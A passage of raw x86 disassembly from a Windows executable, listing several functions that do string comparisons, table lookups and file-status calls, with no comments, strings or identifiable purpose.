  404672:	xor    eax,ebp
  404674:	mov    DWORD PTR [ebp-0x4],eax
  404677:	push   ebx
  404678:	push   esi
  404679:	push   edi
  40467a:	mov    edi,DWORD PTR [ebp+0x8]
  40467d:	mov    DWORD PTR [ebp-0x80c],edx
  404683:	mov    DWORD PTR [ebp-0x818],ecx
  404689:	mov    ecx,DWORD PTR ds:0x40e430
  40468f:	lea    edx,[ebp-0x828]
  404695:	mov    eax,DWORD PTR [ecx]
  404697:	push   edx
  404698:	push   DWORD PTR [edi]
  40469a:	mov    esi,0x4
  40469f:	mov    DWORD PTR [ebp-0x810],esi
  4046a5:	call   DWORD PTR [eax+0x38]
  4046a8:	test   eax,eax
  4046aa:	je     0x404a93
  4046b0:	mov    ecx,DWORD PTR [ebp-0x80c]
  4046b6:	mov    eax,DWORD PTR [ebp-0x828]
  4046bc:	cmp    DWORD PTR [ecx],0x0
  4046bf:	mov    DWORD PTR [ebp-0x81c],eax
  4046c5:	je     0x4047a2
  4046cb:	mov    ecx,DWORD PTR [edi]
  4046cd:	call   0x405b80
  4046d2:	mov    bl,al
  4046d4:	mov    eax,DWORD PTR [ebp-0x80c]
  4046da:	mov    ecx,DWORD PTR [eax]
  4046dc:	mov    ecx,DWORD PTR [ecx]
  4046de:	call   0x405b80
  4046e3:	cmp    bl,al
  4046e5:	je     0x40479c
  4046eb:	movzx  eax,bl
  4046ee:	mov    DWORD PTR [ebp-0x820],eax
  4046f4:	mov    edi,DWORD PTR [eax*4+0x414b28]
  4046fb:	test   edi,edi
  4046fd:	je     0x404736
  4046ff:	mov    ecx,DWORD PTR ds:0x40e430
  404705:	lea    edx,[ebp-0x814]
  40470b:	mov    eax,DWORD PTR [ecx]
  40470d:	push   edx
  40470e:	push   DWORD PTR [edi]
  404710:	call   DWORD PTR [eax+0x38]
  404713:	test   eax,eax
  404715:	je     0x404aa4
  40471b:	mov    edx,DWORD PTR [ebp-0x814]
  404721:	mov    ecx,DWORD PTR [ebp-0x81c]
  404727:	call   0x403690
  40472c:	test   eax,eax
  40472e:	jg     0x40475d
  404730:	mov    eax,DWORD PTR [ebp-0x820]
  404736:	test   bl,bl
  404738:	je     0x40479c
  40473a:	mov    edi,DWORD PTR [eax*4+0x414b24]
  404741:	test   edi,edi
  404743:	je     0x40479c
  404745:	mov    ecx,DWORD PTR [edi]
  404747:	call   0x403650
  40474c:	mov    ecx,DWORD PTR [ebp-0x81c]
  404752:	mov    edx,eax
  404754:	call   0x403690
  404759:	test   eax,eax
  40475b:	jle    0x40479c
  40475d:	mov    eax,DWORD PTR [ebp-0x80c]
  404763:	mov    ecx,DWORD PTR [eax]
  404765:	mov    ecx,DWORD PTR [ecx]
  404767:	call   0x403650
  40476c:	mov    ecx,DWORD PTR [edi]
  40476e:	mov    esi,eax
  404770:	call   0x403650
  404775:	mov    edx,esi
  404777:	mov    ecx,eax
  404779:	call   0x403690
  40477e:	mov    esi,0x4
  404783:	test   eax,eax
  404785:	jle    0x40479c
  404787:	mov    ecx,DWORD PTR [ebp-0x818]
  40478d:	mov    DWORD PTR [ecx],edi
  40478f:	mov    ecx,DWORD PTR [ebp-0x80c]
  404795:	mov    eax,DWORD PTR [edi+0x7]
  404798:	mov    DWORD PTR [ecx],eax
  40479a:	jmp    0x4047a2
  40479c:	mov    ecx,DWORD PTR [ebp-0x80c]
  4047a2:	mov    edi,DWORD PTR [ecx]
  4047a4:	mov    ecx,DWORD PTR [ebp-0x818]
  4047aa:	lea    ebx,[ebx+0x0]
  4047b0:	xor    ebx,ebx
  4047b2:	test   esi,esi
  4047b4:	jle    0x404a6f
  4047ba:	lea    ebx,[ebx+0x0]
  4047c0:	test   edi,edi
  4047c2:	je     0x4047dc
  4047c4:	mov    eax,DWORD PTR [edi]
  4047c6:	mov    DWORD PTR [ebp+ebx*4-0x1030],edi
  4047cd:	mov    edi,DWORD PTR [edi+0x7]
  4047d0:	mov    DWORD PTR [ebp+ebx*4-0x808],eax
  4047d7:	inc    ebx
  4047d8:	cmp    ebx,esi
  4047da:	jl     0x4047c0
  4047dc:	test   ebx,ebx
  4047de:	je     0x404a6f
  4047e4:	mov    ecx,DWORD PTR ds:0x40e430
  4047ea:	lea    eax,[ebx*4+0x0]
  4047f1:	lea    edx,[ebp-0x820]
  4047f7:	mov    esi,DWORD PTR [ebp+eax*1-0x80c]
  4047fe:	mov    DWORD PTR [ebp-0x824],eax
  404804:	mov    eax,DWORD PTR [ecx]
  404806:	push   edx
  404807:	push   esi
  404808:	call   DWORD PTR [eax+0x38]
  40480b:	test   eax,eax
  40480d:	je     0x404a93
  404813:	mov    eax,DWORD PTR [ebp-0x820]
  404819:	cmp    WORD PTR [eax],0x3f
  40481d:	jne    0x404822
  40481f:	add    eax,0x2
  404822:	movzx  eax,WORD PTR [eax]
  404825:	mov    ecx,0xff
  40482a:	cmp    ax,cx
  40482d:	jbe    0x404837
  40482f:	shr    ax,0xc
  404833:	sub    al,0x1a
  404835:	jmp    0x404845
  404837:	cmp    eax,0x41
  40483a:	jb     0x404845
  40483c:	cmp    eax,0x5a
  40483f:	ja     0x404843
  404841:	add    al,0x20
  404843:	add    al,0xe6
  404845:	movzx  ecx,al
  404848:	cmp    DWORD PTR [ecx*4+0x414b28],0x0
  404850:	jne    0x404860
  404852:	mov    eax,DWORD PTR [ebp+ebx*4-0x1034]
  404859:	mov    DWORD PTR [ecx*4+0x414b28],eax
  404860:	mov    ecx,DWORD PTR ds:0x40e430
  404866:	lea    edx,[ebp-0x82c]
  40486c:	mov    eax,DWORD PTR [ecx]
  40486e:	push   edx
  40486f:	push   esi
  404870:	call   DWORD PTR [eax+0x38]
  404873:	test   eax,eax
  404875:	je     0x404a93
  40487b:	mov    ecx,DWORD PTR [ebp-0x81c]
  404881:	mov    esi,DWORD PTR [ebp-0x82c]
  404887:	cmp    WORD PTR [ecx],0x3f
  40488b:	mov    eax,ecx
  40488d:	mov    DWORD PTR [ebp-0x814],ecx
  404893:	jne    0x40489e
  404895:	lea    eax,[ecx+0x2]
  404898:	mov    DWORD PTR [ebp-0x814],eax
  40489e:	cmp    WORD PTR [esi],0x3f
  4048a2:	jne    0x4048a7
  4048a4:	add    esi,0x2
  4048a7:	push   esi
  4048a8:	push   eax
  4048a9:	call   DWORD PTR ds:0x4244bc
  4048af:	add    esp,0x8
  4048b2:	test   eax,eax
  4048b4:	jne    0x4048ed
  4048b6:	mov    eax,DWORD PTR [ebp-0x814]
  4048bc:	lea    esp,[esp+0x0]
  4048c0:	mov    cx,WORD PTR [eax]
  4048c3:	cmp    cx,WORD PTR [esi]
  4048c6:	jne    0x4048e6
  4048c8:	test   cx,cx
  4048cb:	je     0x4048e2
  4048cd:	mov    cx,WORD PTR [eax+0x2]
  4048d1:	cmp    cx,WORD PTR [esi+0x2]
  4048d5:	jne    0x4048e6
  4048d7:	add    eax,0x4
  4048da:	add    esi,0x4
  4048dd:	test   cx,cx
  4048e0:	jne    0x4048c0
  4048e2:	xor    eax,eax
  4048e4:	jmp    0x4048eb
  4048e6:	sbb    eax,eax
  4048e8:	or     eax,0x1
  4048eb:	test   eax,eax
  4048ed:	jle    0x40492e
  4048ef:	mov    esi,DWORD PTR [ebp-0x810]
  4048f5:	mov    eax,DWORD PTR [ebp-0x824]
  4048fb:	mov    ecx,DWORD PTR [ebp-0x818]
  404901:	mov    eax,DWORD PTR [ebp+eax*1-0x1034]
  404908:	add    esi,esi
  40490a:	mov    DWORD PTR [ecx],eax
  40490c:	mov    DWORD PTR [ebp-0x810],esi
  404912:	cmp    esi,0x200
  404918:	jle    0x4047b0
  40491e:	mov    esi,0x200
  404923:	mov    DWORD PTR [ebp-0x810],esi
  404929:	jmp    0x4047b0
  40492e:	test   eax,eax
  404930:	jne    0x40496a
  404932:	mov    ecx,DWORD PTR [ebp-0x80c]
  404938:	mov    eax,DWORD PTR [ebp+ebx*4-0x1034]
  40493f:	mov    DWORD PTR [ecx],eax
  404941:	cmp    ebx,0x1
  404944:	jle    0x404a82
  40494a:	mov    ecx,DWORD PTR [ebp-0x818]
  404950:	mov    eax,DWORD PTR [ebp+ebx*4-0x1038]
  404957:	mov    DWORD PTR [ecx],eax
  404959:	pop    edi
  40495a:	pop    esi
  40495b:	pop    ebx
  40495c:	mov    ecx,DWORD PTR [ebp-0x4]
  40495f:	xor    ecx,ebp
  404961:	call   0x40d492
  404966:	mov    esp,ebp
  404968:	pop    ebp
  404969:	ret    
  40496a:	xor    ecx,ecx
  40496c:	mov    DWORD PTR [ebp-0x814],ecx
  404972:	test   ebx,ebx
  404974:	jle    0x404a3c
  40497a:	lea    ebx,[ebx+0x0]
  404980:	lea    eax,[ecx+ebx*1]
  404983:	mov    ecx,DWORD PTR ds:0x40e430
  404989:	cdq    
  40498a:	sub    eax,edx
  40498c:	mov    edx,DWORD PTR [ecx]
  40498e:	sar    eax,1
  404990:	lea    esi,[ebp-0x824]
  404996:	push   esi
  404997:	push   DWORD PTR [ebp+eax*4-0x808]
  40499e:	mov    DWORD PTR [ebp-0x810],eax
  4049a4:	call   DWORD PTR [edx+0x38]
  4049a7:	test   eax,eax
  4049a9:	je     0x404a93
  4049af:	mov    eax,DWORD PTR [ebp-0x81c]
  4049b5:	mov    esi,DWORD PTR [ebp-0x824]
  4049bb:	cmp    WORD PTR [eax],0x3f
  4049bf:	mov    edi,eax
  4049c1:	jne    0x4049c6
  4049c3:	lea    edi,[eax+0x2]
  4049c6:	cmp    WORD PTR [esi],0x3f
  4049ca:	jne    0x4049cf
  4049cc:	add    esi,0x2
  4049cf:	push   esi
  4049d0:	push   edi
  4049d1:	call   DWORD PTR ds:0x4244bc
  4049d7:	add    esp,0x8
  4049da:	test   eax,eax
  4049dc:	jne    0x404a0f
  4049de:	mov    edi,edi
  4049e0:	mov    ax,WORD PTR [edi]
  4049e3:	cmp    ax,WORD PTR [esi]
  4049e6:	jne    0x404a06
  4049e8:	test   ax,ax
  4049eb:	je     0x404a02
  4049ed:	mov    ax,WORD PTR [edi+0x2]
  4049f1:	cmp    ax,WORD PTR [esi+0x2]
  4049f5:	jne    0x404a06
  4049f7:	add    edi,0x4
  4049fa:	add    esi,0x4
  4049fd:	test   ax,ax
  404a00:	jne    0x4049e0
  404a02:	xor    eax,eax
  404a04:	jmp    0x404a0b
  404a06:	sbb    eax,eax
  404a08:	or     eax,0x1
  404a0b:	test   eax,eax
  404a0d:	je     0x404a36
  404a0f:	jle    0x404a20
  404a11:	mov    ecx,DWORD PTR [ebp-0x810]
  404a17:	inc    ecx
  404a18:	mov    DWORD PTR [ebp-0x814],ecx
  404a1e:	jmp    0x404a2c
  404a20:	mov    ebx,DWORD PTR [ebp-0x810]
  404a26:	mov    ecx,DWORD PTR [ebp-0x814]
  404a2c:	cmp    ecx,ebx
  404a2e:	jl     0x404980
  404a34:	jmp    0x404a3c
  404a36:	mov    ecx,DWORD PTR [ebp-0x810]
  404a3c:	mov    edx,DWORD PTR [ebp-0x80c]
  404a42:	mov    eax,DWORD PTR [ebp+ecx*4-0x1030]
  404a49:	mov    DWORD PTR [edx],eax
  404a4b:	test   ecx,ecx
  404a4d:	je     0x404a82
  404a4f:	mov    eax,DWORD PTR [ebp+ecx*4-0x1034]
  404a56:	mov    ecx,DWORD PTR [ebp-0x818]
  404a5c:	mov    DWORD PTR [ecx],eax
  404a5e:	pop    edi
  404a5f:	pop    esi
  404a60:	pop    ebx
  404a61:	mov    ecx,DWORD PTR [ebp-0x4]
  404a64:	xor    ecx,ebp
  404a66:	call   0x40d492
  404a6b:	mov    esp,ebp
  404a6d:	pop    ebp
  404a6e:	ret    
  404a6f:	mov    ebx,DWORD PTR [ebp-0x80c]
  404a75:	mov    eax,ds:0x414b20
  404a7a:	mov    DWORD PTR [ebx],0x0
  404a80:	mov    DWORD PTR [ecx],eax
  404a82:	mov    ecx,DWORD PTR [ebp-0x4]
  404a85:	pop    edi
  404a86:	pop    esi
  404a87:	xor    ecx,ebp
  404a89:	pop    ebx
  404a8a:	call   0x40d492
  404a8f:	mov    esp,ebp
  404a91:	pop    ebp
  404a92:	ret    
  404a93:	push   0x0
  404a95:	mov    edx,0x4010c0
  404a9a:	mov    ecx,0x5e5
  404a9f:	call   0x407010
  404aa4:	push   0x0
  404aa6:	mov    edx,0x4010c0
  404aab:	mov    ecx,0x5e5
  404ab0:	call   0x407010
  404ab5:	int3   
  404ab6:	int3   
  404ab7:	int3   
  404ab8:	int3   
  404ab9:	int3   
  404aba:	int3   
  404abb:	int3   
  404abc:	int3   
  404abd:	int3   
  404abe:	int3   
  404abf:	int3   
  404ac0:	push   ebp
  404ac1:	mov    ebp,esp
  404ac3:	and    esp,0xfffffff8
  404ac6:	sub    esp,0xe1c
  404acc:	mov    eax,ds:0x40e018
  404ad1:	xor    eax,esp
  404ad3:	mov    DWORD PTR [esp+0xe18],eax
  404ada:	cmp    BYTE PTR ds:0x40e42a,0x0
  404ae1:	push   ebx
  404ae2:	push   esi
  404ae3:	push   edi
  404ae4:	jne    0x404ba1
  404aea:	mov    ecx,DWORD PTR ds:0x40e42c
  404af0:	lea    edx,[esp+0xc]
  404af4:	mov    eax,DWORD PTR [ecx]
  404af6:	push   edx
  404af7:	push   0x4010ec
  404afc:	call   DWORD PTR [eax+0x60]
  404aff:	test   eax,eax
  404b01:	je     0x404b8c
  404b07:	mov    ecx,DWORD PTR [esp+0xc]
  404b0b:	mov    eax,DWORD PTR [ecx]
  404b0d:	call   DWORD PTR [eax]
  404b0f:	mov    edi,eax
  404b11:	test   edi,edi
  404b13:	je     0x404b83
  404b15:	mov    eax,0x24924925
  404b1a:	mul    edi
  404b1c:	sub    edi,edx
  404b1e:	shr    edi,1
  404b20:	add    edi,edx
  404b22:	shr    edi,0x2
  404b25:	push   edi
  404b26:	push   ecx
  404b27:	push   DWORD PTR [esp+0x14]
  404b2b:	lea    ecx,[esp+0x1c]
  404b2f:	call   0x4061e0
  404b34:	xor    ebx,ebx
  404b36:	xor    esi,esi
  404b38:	test   edi,edi
  404b3a:	jle    0x404b7d
  404b3c:	lea    esp,[esp+0x0]
  404b40:	push   esi
  404b41:	lea    ecx,[esp+0x14]
  404b45:	call   0x406250
  404b4a:	mov    ecx,DWORD PTR [eax]
  404b4c:	push   0x0
  404b4e:	sub    esp,0x8
  404b51:	mov    edx,esp
  404b53:	mov    DWORD PTR [edx],ecx
  404b55:	mov    cx,WORD PTR [eax+0x4]
  404b59:	mov    al,BYTE PTR [eax+0x6]
  404b5c:	mov    WORD PTR [edx+0x4],cx
  404b60:	mov    BYTE PTR [edx+0x6],al
  404b63:	call   0x4068c0
  404b68:	test   esi,esi
  404b6a:	je     0x404b71
  404b6c:	mov    DWORD PTR [ebx+0x7],eax
  404b6f:	jmp    0x404b76
  404b71:	mov    ds:0x414b1c,eax
  404b76:	inc    esi
  404b77:	mov    ebx,eax
  404b79:	cmp    esi,edi
  404b7b:	jl     0x404b40
  404b7d:	mov    DWORD PTR ds:0x414b20,ebx
  404b83:	mov    ecx,DWORD PTR [esp+0xc]
  404b87:	mov    eax,DWORD PTR [ecx]
  404b89:	call   DWORD PTR [eax+0x18]
  404b8c:	mov    ecx,DWORD PTR [esp+0xe24]
  404b93:	pop    edi
  404b94:	pop    esi
  404b95:	pop    ebx
  404b96:	xor    ecx,esp
  404b98:	call   0x40d492
  404b9d:	mov    esp,ebp
  404b9f:	pop    ebp
  404ba0:	ret    
  404ba1:	call   0x407400
  404ba6:	int3   
  404ba7:	int3   
  404ba8:	int3   
  404ba9:	int3   
  404baa:	int3   
  404bab:	int3   
  404bac:	int3   
  404bad:	int3   
  404bae:	int3   
  404baf:	int3   
  404bb0:	push   ebp
  404bb1:	mov    ebp,esp
  404bb3:	and    esp,0xfffffff8
  404bb6:	mov    eax,0x1664
  404bbb:	call   0x40db40
  404bc0:	mov    eax,ds:0x40e018
  404bc5:	xor    eax,esp
  404bc7:	mov    DWORD PTR [esp+0x1660],eax
  404bce:	cmp    BYTE PTR ds:0x40e42a,0x0
  404bd5:	push   ebx
  404bd6:	push   esi
  404bd7:	push   edi
  404bd8:	jne    0x404dd4
  404bde:	mov    ecx,DWORD PTR ds:0x40e42c
  404be4:	lea    edx,[esp+0x10]
  404be8:	mov    eax,DWORD PTR [ecx]
  404bea:	push   edx
  404beb:	push   0x40111c
  404bf0:	call   DWORD PTR [eax+0x60]
  404bf3:	test   eax,eax
  404bf5:	je     0x404dbf
  404bfb:	mov    ecx,DWORD PTR [esp+0x10]
  404bff:	mov    eax,DWORD PTR [ecx]
  404c01:	call   DWORD PTR [eax]
  404c03:	mov    ecx,DWORD PTR [esp+0x10]
  404c07:	mov    esi,eax
  404c09:	cmp    esi,0xa
  404c0c:	jb     0x404dba
  404c12:	lea    edx,[esp+0x14]
  404c16:	push   edx
  404c17:	lea    edx,[esp+0x20]
  404c1b:	mov    DWORD PTR [esp+0x18],0xa
  404c23:	mov    eax,DWORD PTR [ecx]
  404c25:	push   edx
  404c26:	push   0x0
  404c28:	call   DWORD PTR [eax+0x4]
  404c2b:	test   eax,eax
  404c2d:	je     0x404dd9
  404c33:	cmp    DWORD PTR [esp+0x14],0xa
  404c38:	jne    0x404dd9
  404c3e:	mov    ecx,DWORD PTR [esp+0x1c]
  404c42:	call   0x403650
  404c47:	mov    edi,eax
  404c49:	lea    eax,[esp+0x28]
  404c4d:	push   eax
  404c4e:	push   edi
  404c4f:	call   DWORD PTR ds:0x4244b0
  404c55:	add    esp,0x8
  404c58:	cmp    eax,0xffffffff
  404c5b:	je     0x404db6
  404c61:	mov    ecx,DWORD PTR [esp+0x20]
  404c65:	xor    eax,eax
  404c67:	cmp    ecx,DWORD PTR [esp+0x48]
  404c6b:	jne    0x404db6
  404c71:	cmp    eax,DWORD PTR [esp+0x4c]
  404c75:	jne    0x404db6
  404c7b:	movzx  ecx,WORD PTR [esp+0x24]
  404c80:	mov    eax,ds:0x40eaec
  404c85:	cmp    BYTE PTR [ecx+eax*1],0x0
  404c89:	jne    0x404db6
  404c8f:	lea    ecx,[esi-0xa]
  404c92:	mov    eax,0xba2e8ba3
  404c97:	mul    ecx
  404c99:	mov    ebx,edx
  404c9b:	shr    ebx,0x3
  404c9e:	mov    eax,ebx
  404ca0:	imul   eax,eax,0xb
  404ca3:	add    eax,0xa
  404ca6:	mov    DWORD PTR [esp+0x18],0xa
  404cae:	cmp    eax,esi
  404cb0:	je     0x404cea
  404cb2:	mov    ecx,DWORD PTR [esp+0x10]
  404cb6:	lea    edx,[esp+0x14]
  404cba:	push   edx
  404cbb:	lea    edx,[esp+0x28]
  404cbf:	mov    DWORD PTR [esp+0x18],0x2
  404cc7:	mov    eax,DWORD PTR [ecx]
  404cc9:	push   edx
  404cca:	push   0xc
  404ccc:	mov    DWORD PTR [esp+0x24],0xe
  404cd4:	call   DWORD PTR [eax+0x4]
  404cd7:	test   eax,eax
  404cd9:	je     0x404dd9
  404cdf:	cmp    DWORD PTR [esp+0x14],0x2
  404ce4:	jne    0x404dd9
  404cea:	push   0x10
  404cec:	push   0x0
  404cee:	push   DWORD PTR ds:0x40e648
  404cf4:	call   DWORD PTR ds:0x4242c4
  404cfa:	test   eax,eax
  404cfc:	je     0x404dde
  404d02:	sub    esp,0x8
  404d05:	mov    ecx,eax
  404d07:	call   0x4061b0
  404d0c:	mov    ds:0x40e414,eax
  404d11:	test   eax,eax
  404d13:	je     0x404de8
  404d19:	mov    esi,edi
  404d1b:	lea    ecx,[esi+0x2]
  404d1e:	mov    edi,edi
  404d20:	mov    ax,WORD PTR [esi]
  404d23:	add    esi,0x2
  404d26:	test   ax,ax
  404d29:	jne    0x404d20
  404d2b:	sub    esi,ecx
  404d2d:	sar    esi,1
  404d2f:	inc    esi
  404d30:	push   0x400
  404d35:	mov    edx,esi
  404d37:	mov    ecx,0x40e03c
  404d3c:	call   0x406bd0
  404d41:	add    esp,0x4
  404d44:	mov    ds:0x40e024,eax
  404d49:	push   edi
  404d4a:	push   esi
  404d4b:	push   eax
  404d4c:	call   DWORD PTR ds:0x4244b8
  404d52:	mov    ax,WORD PTR [esp+0x30]
  404d57:	add    esp,0xc
  404d5a:	lea    ecx,[esp+0x58]
  404d5e:	push   ebx
  404d5f:	push   DWORD PTR [esp+0x1c]
  404d63:	mov    ds:0x40e020,ax
  404d69:	push   DWORD PTR [esp+0x18]
  404d6d:	call   0x4062e0
  404d72:	xor    edi,edi
  404d74:	test   ebx,ebx
  404d76:	jle    0x404db6
  404d78:	jmp    0x404d80
  404d7a:	lea    ebx,[ebx+0x0]
  404d80:	push   edi
  404d81:	lea    ecx,[esp+0x5c]
  404d85:	call   0x406340
  404d8a:	mov    esi,eax
  404d8c:	sub    esp,0x8
  404d8f:	mov    ecx,DWORD PTR [esi]
  404d91:	mov    edx,esp
  404d93:	mov    DWORD PTR [edx],ecx
  404d95:	mov    cx,WORD PTR [esi+0x4]
  404d99:	mov    WORD PTR [edx+0x4],cx
  404d9d:	mov    cl,BYTE PTR [esi+0x6]
  404da0:	mov    BYTE PTR [edx+0x6],cl
  404da3:	call   0x4067e0
  404da8:	push   eax
  404da9:	push   DWORD PTR [esi+0x7]
  404dac:	call   0x406b20
  404db1:	inc    edi
  404db2:	cmp    edi,ebx
  404db4:	jl     0x404d80
  404db6:	mov    ecx,DWORD PTR [esp+0x10]
  404dba:	mov    eax,DWORD PTR [ecx]
  404dbc:	call   DWORD PTR [eax+0x18]
  404dbf:	mov    ecx,DWORD PTR [esp+0x166c]
  404dc6:	pop    edi
  404dc7:	pop    esi
  404dc8:	pop    ebx
  404dc9:	xor    ecx,esp
  404dcb:	call   0x40d492
  404dd0:	mov    esp,ebp
  404dd2:	pop    ebp
  404dd3:	ret    
  404dd4:	call   0x407400
  404dd9:	call   0x402190
  404dde:	mov    DWORD PTR ds:0x40e414,0x0
  404de8:	push   0x0
  404dea:	mov    edx,0x4010c0
  404def:	mov    ecx,0x5e5
  404df4:	call   0x407010
  404df9:	int3   
  404dfa:	int3   
  404dfb:	int3   
  404dfc:	int3   
  404dfd:	int3   
  404dfe:	int3   
  404dff:	int3   
  404e00:	push   ebp
  404e01:	mov    ebp,esp
  404e03:	and    esp,0xfffffff8
  404e06:	sub    esp,0x4c
  404e09:	mov    eax,ds:0x40e018
  404e0e:	xor    eax,esp
  404e10:	mov    DWORD PTR [esp+0x48],eax
  404e14:	push   ebx
  404e15:	push   esi
  404e16:	push   edi
  404e17:	mov    edi,DWORD PTR ds:0x40e414
  404e1d:	test   edi,edi
  404e1f:	je     0x404f3f
  404e25:	cmp    BYTE PTR ds:0x40e022,0x0
  404e2c:	jne    0x404f3f
  404e32:	cmp    BYTE PTR ds:0x40e42a,0x0
  404e39:	jne    0x404f51
  404e3f:	mov    edi,DWORD PTR [edi+0x4]
  404e42:	test   edi,edi
  404e44:	je     0x404f3f
  404e4a:	mov    eax,ds:0x40e024
  404e4f:	cmp    WORD PTR [eax],0x0
  404e53:	je     0x404f3f
  404e59:	lea    ecx,[esp+0x20]
  404e5d:	push   ecx
  404e5e:	push   eax
  404e5f:	call   DWORD PTR ds:0x4244b0
  404e65:	add    esp,0x8
  404e68:	cmp    eax,0xffffffff
  404e6b:	je     0x404f3f
  404e71:	imul   edi,edi,0xb
  404e74:	add    edi,0xa
  404e77:	mov    ecx,edi
  404e79:	call   0x40c940
  404e7e:	mov    ecx,DWORD PTR [esp+0x40]
  404e82:	mov    ebx,eax
  404e84:	mov    DWORD PTR [ebx+0x4],ecx
  404e87:	mov    ecx,DWORD PTR ds:0x40e024
  404e8d:	lea    esi,[ebx+0xa]
  404e90:	call   0x403610
  404e95:	mov    cx,WORD PTR ds:0x40e020
  404e9c:	mov    DWORD PTR [ebx],eax
  404e9e:	mov    eax,ds:0x40e414
  404ea3:	mov    WORD PTR [ebx+0x8],cx
  404ea7:	lea    ecx,[esp+0x10]
  404eab:	mov    DWORD PTR [esp+0x10],0x40113c
  404eb3:	mov    DWORD PTR [esp+0x14],eax
  404eb7:	mov    DWORD PTR [esp+0x1c],0xffffffff
  404ebf:	mov    DWORD PTR [esp+0x18],0x0
  404ec7:	call   0x4063f0
  404ecc:	test   eax,eax
  404ece:	je     0x404f00
  404ed0:	mov    edx,DWORD PTR [esp+0x18]
  404ed4:	lea    esi,[esi+0xb]
  404ed7:	mov    ecx,DWORD PTR [edx+0x8]
  404eda:	mov    eax,DWORD PTR [ecx]
  404edc:	mov    DWORD PTR [esi-0xb],eax
  404edf:	mov    ax,WORD PTR [ecx+0x4]
  404ee3:	mov    WORD PTR [esi-0x7],ax
  404ee7:	mov    al,BYTE PTR [ecx+0x6]
  404eea:	mov    BYTE PTR [esi-0x5],al
  404eed:	mov    eax,DWORD PTR [edx+0x4]
  404ef0:	mov    DWORD PTR [esi-0x4],eax
  404ef3:	lea    ecx,[esp+0x10]
  404ef7:	call   0x4063f0
  404efc:	test   eax,eax
  404efe:	jne    0x404ed0
  404f00:	mov    ecx,DWORD PTR ds:0x40e42c
  404f06:	lea    edx,[esp+0xc]
  404f0a:	mov    eax,DWORD PTR [ecx]
  404f0c:	push   edx
  404f0d:	push   0x40111c
  404f12:	call   DWORD PTR [eax+0x60]
  404f15:	test   eax,eax
  404f17:	je     0x404f56
  404f19:	mov    ecx,DWORD PTR [esp+0xc]
  404f1d:	push   edi
  404f1e:	mov    eax,DWORD PTR [ecx]
  404f20:	push   ebx
  404f21:	call   DWORD PTR [eax+0xc]
  404f24:	test   eax,eax
  404f26:	je     0x404f56
  404f28:	mov    ecx,DWORD PTR [esp+0xc]
  404f2c:	mov    eax,DWORD PTR [ecx]
  404f2e:	call   DWORD PTR [eax+0x18]
  404f31:	test   eax,eax
  404f33:	je     0x404f56
  404f35:	push   ebx
  404f36:	call   DWORD PTR ds:0x42441c
  404f3c:	add    esp,0x4
  404f3f:	mov    ecx,DWORD PTR [esp+0x54]
  404f43:	pop    edi
  404f44:	pop    esi
  404f45:	pop    ebx
  404f46:	xor    ecx,esp
  404f48:	call   0x40d492
  404f4d:	mov    esp,ebp
  404f4f:	pop    ebp
  404f50:	ret    
  404f51:	call   0x407400
  404f56:	call   0x4021b0
  404f5b:	int3   
  404f5c:	int3   
  404f5d:	int3   
  404f5e:	int3   
  404f5f:	int3   
  404f60:	push   ebp
  404f61:	mov    ebp,esp
  404f63:	mov    eax,0x5fa4
  404f68:	call   0x40db40
  404f6d:	mov    eax,ds:0x40e018
  404f72:	xor    eax,ebp
  404f74:	mov    DWORD PTR [ebp-0x4],eax
  404f77:	cmp    BYTE PTR ds:0x40e42a,0x0
  404f7e:	push   ebx
  404f7f:	push   esi
  404f80:	mov    bh,dl
  404f82:	mov    esi,ecx
  404f84:	push   edi
  404f85:	mov    BYTE PTR [ebp-0x5f42],bh
  404f8b:	mov    DWORD PTR [ebp-0x5f50],esi
  404f91:	jne    0x4059f5
  404f97:	cmp    WORD PTR [esi+0x10],0x0
  404f9c:	mov    BYTE PTR [ebp-0x5f41],0x0
  404fa3:	je     0x404fc2
  404fa5:	mov    ecx,DWORD PTR [esi+0x26]
  404fa8:	shl    ecx,0x2
  404fab:	call   0x40cef0
  404fb0:	mov    DWORD PTR [esi+0x1e],eax
  404fb3:	xor    eax,eax
  404fb5:	mov    DWORD PTR [esi+0x4],eax
  404fb8:	mov    DWORD PTR [esi+0x8],eax
  404fbb:	mov    BYTE PTR [ebp-0x5f41],0x1
  404fc2:	mov    eax,0x1
  404fc7:	push   0x401108
  404fcc:	mov    WORD PTR [esi+0x10],ax
  404fd0:	lea    eax,[ebp-0x430]
  404fd6:	push   0x212
  404fdb:	push   eax
  404fdc:	call   DWORD PTR ds:0x4244b8
  404fe2:	mov    ecx,DWORD PTR ds:0x40e430
  404fe8:	add    esp,0xc
  404feb:	mov    eax,DWORD PTR [ecx]
  404fed:	lea    edx,[ebp-0x5f58]
  404ff3:	push   edx
  404ff4:	push   DWORD PTR [esi]
  404ff6:	call   DWORD PTR [eax+0x38]
  404ff9:	test   eax,eax
  404ffb:	je     0x4059fa
  405001:	push   DWORD PTR [ebp-0x5f58]
  405007:	lea    eax,[ebp-0x430]
  40500d:	push   0x212
  405012:	push   eax
  405013:	call   DWORD PTR ds:0x4244b4
  405019:	mov    ecx,DWORD PTR ds:0x40e42c
  40501f:	add    esp,0xc
  405022:	mov    eax,DWORD PTR [ecx]
  405024:	lea    edx,[ebp-0x5f48]
  40502a:	push   edx
  40502b:	lea    edx,[ebp-0x430]
  405031:	push   edx
  405032:	call   DWORD PTR [eax+0x60]
  405035:	test   eax,eax
  405037:	je     0x4050d4
  40503d:	mov    ecx,DWORD PTR [ebp-0x5f48]
  405043:	mov    eax,DWORD PTR [ecx]
  405045:	call   DWORD PTR [eax]
  405047:	mov    ecx,DWORD PTR [ebp-0x5f48]
  40504d:	test   eax,eax
  40504f:	je     0x4050cf
  405051:	lea    edx,[ebp-0x5f8c]
  405057:	push   edx
  405058:	lea    edx,[ebp-0x5f40]
  40505e:	mov    DWORD PTR [ebp-0x5f8c],0x99
  405068:	mov    eax,DWORD PTR [ecx]
  40506a:	push   edx
  40506b:	push   0x0
  40506d:	call   DWORD PTR [eax+0x4]
  405070:	test   eax,eax
  405072:	je     0x405a0b
  405078:	cmp    DWORD PTR [ebp-0x5f40],0x3
  40507f:	jne    0x405a15
  405085:	cmp    DWORD PTR [ebp-0x5f3c],0x3
  40508c:	jne    0x405a15
  405092:	mov    bl,BYTE PTR [ebp-0x5f2e]
  405098:	mov    dx,WORD PTR [ebp-0x5f2d]
  40509f:	mov    eax,0xffff
  4050a4:	test   bl,bl
  4050a6:	je     0x4050e7
  4050a8:	cmp    BYTE PTR [ebp-0x5f41],0x0
  4050af:	jne    0x4050e5
  4050b1:	cmp    dx,ax
  4050b4:	jne    0x4050ba
